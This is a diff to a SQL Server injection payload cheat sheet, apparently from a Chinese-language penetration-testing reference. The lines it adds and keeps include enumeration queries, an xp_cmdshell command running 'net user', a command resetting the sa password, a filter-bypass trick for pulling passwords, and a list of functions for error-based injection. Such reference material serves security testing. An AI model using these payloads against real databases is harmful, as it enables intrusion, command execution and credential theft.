@@ -1,7 +1,9 @@
 SQL Server Payload
 =====================================
 
-- Version 
+常见Payload
+----------------------------------------
+- Version
     - ``SELECT @@version``
 - Comment 
     - ``SELECT 1 -- comment``
@@ -19,7 +21,7 @@ SQL Server Payload
     - ``SELECT DB_NAME()``
 - List Database
     - ``SELECT name FROM master..sysdatabases``
-- Command
+- 执行命令
     - ``EXEC xp_cmdshell 'net user'``
 - Ascii
     - ``SELECT char(0x41)``
@@ -31,3 +33,17 @@ SQL Server Payload
     - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
 - Trick
     - ``id=1 union:select password from:user``
+- 文件读取
+    - OpenRowset
+- 当前查询语句
+    - ``select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)``
+
+错误注入常用函数
+----------------------------------------
+- SUSER_NAME()
+- USER_NAME()
+- PERMISSIONS()
+- DB_NAME()
+- FILE_NAME()
+- TYPE_NAME()
+- COL_NAME()
